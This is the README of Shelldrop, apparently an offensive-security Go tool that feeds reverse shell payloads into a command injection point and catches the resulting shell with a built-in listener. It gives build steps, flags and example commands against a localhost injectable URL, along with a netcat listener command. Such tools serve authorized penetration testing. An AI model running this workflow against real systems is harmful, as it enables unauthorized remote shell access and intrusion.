# Shelldrop

A command injection tool that leverages an injection point by automatically testing for working reverse shell payloads.

Shelldrop works by injecting payloads into the provided `SHELLDROP` keyword/placeholder.

**Features:**

- Configurable injection point
- Automatic payload detection
- Built-in listener
- Flexible configuration

![til](./demo/demo.gif)

## Build

```bash
git clone https://github.com/shhrew/shelldrop
cd shelldrop
go build -o shelldrop
```

## Usage

```bash
usage: shelldrop [-h|--help] -u|--url "<value>" -l|--lhost "<value>" -p|--lport
                 <integer> [-P|--payload "<value>"] [--no-listener]

                 Leverages a command injection vulnerability by finding and
                 executing compatible reverse shell payloads.

[*] = Asterisked arguments can contain the SHELLDROP injection keyword

Arguments:

  -h  --help         Print help information
  -u  --url          The target url [*]
  -l  --lhost        The listen address
  -p  --lport        The listen port
  -P  --payload      Optional payload to use
      --no-listener  Disable the built-in listener
```

## Examples

#### URL Injection

```bash
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP"
```

#### Using Specific Payload

```bash
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP" -P bash_tcp_1
```

#### Using External Listener
```bash
# Start your own listener first
nc -lvp 4444

# Run shelldrop with built-in listener disabled
shelldrop -l 127.0.0.1 -p 7331 -u "http://localhost/shell.php?cmd=SHELLDROP" --no-listener
```
